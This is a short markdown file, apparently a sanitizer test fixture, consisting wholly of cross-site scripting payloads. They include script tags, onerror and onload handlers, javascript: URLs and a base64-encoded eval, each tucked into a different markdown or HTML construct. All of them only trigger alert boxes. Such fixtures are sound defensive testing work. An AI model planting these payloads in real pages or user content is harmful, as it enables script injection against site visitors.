![alt text](javascript:void(0)) <script>alert('XSS after image')</script>

[link text](javascript:eval(atob('YWxlcnQoJ2Jhc2U2NCBYU1MnKQ=='))) 

<details><summary>Click me</summary><img src=x onerror=alert('XSS in details')></details>

<table><tr><td><script>alert('XSS in table')</script></td></tr></table>

<kbd><img src=x onerror=alert('XSS in kbd')></kbd>

<mark><iframe src="javascript:alert('XSS in mark')"></iframe></mark>

<blockquote><svg onload=alert('XSS in blockquote')></blockquote>

<pre><code><img src=x onerror=alert('XSS in code block')></code></pre>

***<script>alert('XSS after emphasis')</script>***

`code` <img src=x onerror=alert('XSS after inline code')>

> Quote <script>alert('XSS in quote')</script>